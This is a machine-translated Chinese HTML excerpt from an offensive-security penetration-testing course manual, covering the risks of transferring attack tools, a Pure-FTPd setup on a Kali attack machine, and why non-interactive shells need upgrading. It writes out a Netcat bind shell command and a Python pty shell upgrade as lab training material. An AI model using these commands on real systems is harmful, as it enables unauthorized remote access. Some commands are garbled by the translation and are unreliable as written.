<div style="position:absolute;top:42157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参与，应谨慎使用，仅在特定条件下使用。</font><font style="vertical-align: inherit;">我们会讨论</font></font></nobr></div>
<div style="position:absolute;top:42176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本节中的这些条件。</font></font></nobr></div>
<div style="position:absolute;top:42209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还将讨论一些有助于练习和演示的基本准备工作</font></font></nobr></div>
<div style="position:absolute;top:42228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克服了标准 shell 在文件传输方面的一些限制。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42263;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:42263;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转移攻击工具的危险</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在某些情况下，我们可能需要将攻击工具和实用程序转移到我们的目标。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:42320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出于多种原因，转移这些工具可能很危险。</font></font></nobr></div>
<div style="position:absolute;top:42353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们的后开发攻击工具可能会被恶意方滥用，这会使客户端的</font></font></nobr></div>
<div style="position:absolute;top:42372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源处于危险之中。</font><font style="vertical-align: inherit;">这是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常重要的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记录上传和后删除</font></font></nobr></div>
<div style="position:absolute;top:42392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评估完成。</font></font></nobr></div>
<div style="position:absolute;top:42425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第二，防病毒软件，它扫描端点文件系统以搜索预定义文件</font></font></nobr></div>
<div style="position:absolute;top:42444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">签名，在这个阶段对我们来说是一个巨大的挫折。</font><font style="vertical-align: inherit;">这个软件无处不在</font></font></nobr></div>
<div style="position:absolute;top:42463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在大多数企业环境中，将检测我们的攻击工具，隔离它们（渲染它们</font></font></nobr></div>
<div style="position:absolute;top:42482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没用），并提醒系统管理员。</font></font></nobr></div>
<div style="position:absolute;top:42515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果系统管理员勤奋，这将花费我们一个宝贵的内部远程shell，或者在极端情况下</font></font></nobr></div>
<div style="position:absolute;top:42535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">案例，标志着我们参与的有效结束。</font><font style="vertical-align: inherit;">虽然防病毒规避超出了范围</font></font></nobr></div>
<div style="position:absolute;top:42554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个模块，我们在另一个模块中详细讨论这个话题。</font></font></nobr></div>
<div style="position:absolute;top:42587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为一般经验法则，我们应该始终尝试在受感染系统上使用本机工具。</font></font></nobr></div>
<div style="position:absolute;top:42606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者，我们可以在本地工具不足时上传其他工具，当我们有</font></font></nobr></div>
<div style="position:absolute;top:42625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定被检测的风险被最小化，或者当我们的需要超过风险时</font></font></nobr></div>
<div style="position:absolute;top:42645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42679;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1.2</font></font></i></nobr></div>
<div style="position:absolute;top:42679;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装 Pure-FTPd</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了适应本模块中的练习，让我们快速安装 Pure-FTPd 服务器</font></font></nobr></div>
<div style="position:absolute;top:42737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的 Kali 攻击机。</font><font style="vertical-align: inherit;">如果您已经在 Kali 系统上配置了 FTP 服务器，您可以</font></font></nobr></div>
<div style="position:absolute;top:42756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跳过这些步骤。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:42791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt update &amp;&amp; sudo apt install pure-ftpd</font></font></font></b></nobr></div>
<div style="position:absolute;top:42810;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 463 - 在 Kali 上安装 Pure-FTP </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:42943;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="37"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 37 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:42976;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:44053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:44053;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:44053;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">478</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在任何客户端可以连接到我们的 FTP 服务器之前，我们需要为 Pure-FTPd 创建一个新用户。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:43091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下 Bash 脚本将为我们自动创建用户：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./setup-ftp.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:43143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:43177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">groupadd ftpgroup</font></font></nobr></div>
<div style="position:absolute;top:43194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">useradd -g ftpgroup -d /dev/null -s /etc ftpuser</font></font></nobr></div>
<div style="position:absolute;top:43211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pure-pw useradd offsec -u ftpuser -d /ftphome</font></font></nobr></div>
<div style="position:absolute;top:43228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纯密码 mkdb</font></font></nobr></div>
<div style="position:absolute;top:43245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /etc/pure-ftpd/auth/</font></font></nobr></div>
<div style="position:absolute;top:43262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ln -s ../conf/PureDB 60pdb</font></font></nobr></div>
<div style="position:absolute;top:43279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir -p /ftphome</font></font></nobr></div>
<div style="position:absolute;top:43296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chown -R ftpuser:ftpgroup /ftphome/</font></font></nobr></div>
<div style="position:absolute;top:43313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl restart pure-ftpd</font></font></nobr></div>
<div style="position:absolute;top:43332;left:315"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 464 - 在 Kali 上设置 Pure-FTP 的 Bash 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使脚本可执行，然后运行它并输入“lab”作为 offsec 用户的密码</font></font></nobr></div>
<div style="position:absolute;top:43381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提示时：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x setup-ftp.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:43433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo ./setup-ftp.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:43450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码：</font></font></nobr></div>
<div style="position:absolute;top:43466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次输入：</font></font></nobr></div>
<div style="position:absolute;top:43483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重启ftp服务器</font></font></nobr></div>
<div style="position:absolute;top:43503;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 465 - 在 Kali 上设置和启动 Pure-FTP</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:43534;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1.3</font></font></i></nobr></div>
<div style="position:absolute;top:43534;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非交互式外壳</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数类似 Netcat 的工具都提供非交互式 shell，这意味着需要用户的程序</font></font></nobr></div>
<div style="position:absolute;top:43591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">诸如许多文件传输程序或</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">su</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo 之类的输入</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">往往效果不佳，如果有的话。</font><font style="vertical-align: inherit;">非-</font></font></nobr></div>
<div style="position:absolute;top:43610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互式 shell 也缺乏有用的功能，如选项卡完成和作业控制。</font><font style="vertical-align: inherit;">一个例子会有所帮助</font></font></nobr></div>
<div style="position:absolute;top:43630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明这个问题。</font></font></nobr></div>
<div style="position:absolute;top:43663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">希望您熟悉</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">此命令</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是非交互式的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，因为它可以</font></font></nobr></div>
<div style="position:absolute;top:43682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无需用户交互即可完成。</font></font></nobr></div>
<div style="position:absolute;top:43715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相比之下，请考虑从 Debian 实验室客户端到 Kali 系统的典型 FTP 登录会话：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:43767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到 10.11.0.4。</font></font></nobr></div>
<div style="position:absolute;top:43784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220---------- 欢迎使用 Pure-FTPd [privsep] [TLS] ----------</font></font></nobr></div>
<div style="position:absolute;top:43801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220-您是允许的 50 个用户中的第 1 个。</font></font></nobr></div>
<div style="position:absolute;top:43818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220-当地时间现在是 09:07。</font><font style="vertical-align: inherit;">服务器端口：21。</font></font></nobr></div>
<div style="position:absolute;top:43835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220-这是一个私人系统 - 没有匿名登录</font></font></nobr></div>
<div style="position:absolute;top:43852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此服务器也欢迎 220-IPv6 连接。</font></font></nobr></div>
<div style="position:absolute;top:43869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220 您将在 15 分钟不活动后断开连接。</font></font></nobr></div>
<div style="position:absolute;top:43885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">姓名 (10.11.0.4:student): </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">offsec</font></font></font></b></nobr></div>
<div style="position:absolute;top:43902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">331 用户关闭正常。</font><font style="vertical-align: inherit;">要求输入密码</font></font></nobr></div>
<div style="position:absolute;top:43920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码：</font></font></nobr></div>
<div style="position:absolute;top:43937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">230 好的。</font><font style="vertical-align: inherit;">当前目录是/</font></font></nobr></div>
<div style="position:absolute;top:43954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程系统类型是 UNIX。</font></font></nobr></div>
<div style="position:absolute;top:43970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用二进制方式传输文件。</font></font></nobr></div>
<div style="position:absolute;top:43987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再见</font></font></font></b></nobr></div>
<div style="position:absolute;top:44004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">221-再见。</font><font style="vertical-align: inherit;">您上传了 0 并下载了 0 KB。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:44131;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="38"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 38 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:44164;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:45241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:45241;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:45241;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">479</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">221 登出。</font></font></nobr></div>
<div style="position:absolute;top:44276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生@debian:~$</font></font></nobr></div>
<div style="position:absolute;top:44296;left:359"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 466 - FTP 服务器交互</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个会话中，我们输入用户名和密码，输入后才退出进程</font></font></nobr></div>
<div style="position:absolute;top:44345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再见</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">这是一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序；</font><font style="vertical-align: inherit;">它需要用户干预才能完成。</font></font></nobr></div>
<div style="position:absolute;top:44378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管此时问题可能很明显，但让我们尝试通过非</font></font></nobr></div>
<div style="position:absolute;top:44397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互式 shell，在本例中为 Netcat。</font></font></nobr></div>
<div style="position:absolute;top:44430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们假设我们已经入侵了 Debian 客户端并获得了对 Netcat 的访问权限</font></font></nobr></div>
<div style="position:absolute;top:44449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绑定外壳。</font><font style="vertical-align: inherit;">我们将在监听端口 4444 的 Debian 客户端上启动 Netcat 来模拟：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -lvnp 4444 -e /bin/bash</font></font></font></b></nobr></div>
<div style="position:absolute;top:44501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:44520;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 467 - 配置 Netcat 绑定 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从我们的 Kali 系统，我们将连接到监听 shell 并尝试从</font></font></nobr></div>
<div style="position:absolute;top:44569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次列出466：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -vn 10.11.0.128 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:44621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:44638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离场</font></font></nobr></div>
<div style="position:absolute;top:44655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室</font></font></nobr></div>
<div style="position:absolute;top:44672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再见</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:44706;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^C</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font></nobr></div>
<div style="position:absolute;top:44742;left:263"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 468 - 在非交互式 shell 中尝试 FTP 连接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在幕后，我们正在与 FTP 服务器交互，但是我们没有收到任何反馈</font></font></nobr></div>
<div style="position:absolute;top:44791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的外壳。</font><font style="vertical-align: inherit;">这是因为 FTP 会话（交互式程序）的标准输出不是</font></font></nobr></div>
<div style="position:absolute;top:44810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在基本绑定或反向 shell 中正确重定向。</font><font style="vertical-align: inherit;">这导致我们的外壳失去控制</font></font></nobr></div>
<div style="position:absolute;top:44829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们被迫用</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> + </font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完全退出它</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这可能会被证明是非常有问题的</font></font></nobr></div>
<div style="position:absolute;top:44849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评估。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:44883;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1.3.1 升级非交互式 Shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们了解了非交互式 shell 的一些局限性，让我们来看看我们如何</font></font></nobr></div>
<div style="position:absolute;top:44937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以“升级”我们的外壳，使其更有用。</font><font style="vertical-align: inherit;">Python 解释器，经常安装在 Linux 上</font></font></nobr></div>
<div style="position:absolute;top:44956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统，带有一个名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pty</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的标准模块</font><font style="vertical-align: inherit;">，允许创建伪终端。</font></font></nobr></div>
<div style="position:absolute;top:44975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过使用这个模块，我们可以从我们的远程 shell 中产生一个单独的进程并获得一个完整的</font></font></nobr></div>
<div style="position:absolute;top:44995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互式外壳。</font><font style="vertical-align: inherit;">让我们试试这个。</font></font></nobr></div>
<div style="position:absolute;top:45028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将重新连接到我们的监听 Netcat shell，并生成我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pty</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> shell：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -vn 10.11.0.128 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:45080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.128] 4444 (?) 打开</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:45097;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python -c 'import pty; </font><font style="vertical-align: inherit;">pty.spawn("/bin/bash")'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生@debian:~$</font></font></nobr></div>
<div style="position:absolute;top:45133;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 469 - 使用 Python 升级我们的 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行我们的 Python 命令后，我们会立即看到一个熟悉的 Bash 提示符。</font><font style="vertical-align: inherit;">让我们</font></font></nobr></div>
<div style="position:absolute;top:45182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次尝试连接到我们的本地 FTP 服务器，这次是通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pty</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> shell 并查看它的行为：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:45319;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="39"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 39 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:45352;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:46429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:46429;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:46429;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">480</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:45467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:45484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到 10.11.0.4。</font></font></nobr></div>
<div style="position:absolute;top:45501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220---------- 欢迎使用 Pure-FTPd [privsep] [TLS] ----------</font></font></nobr></div>
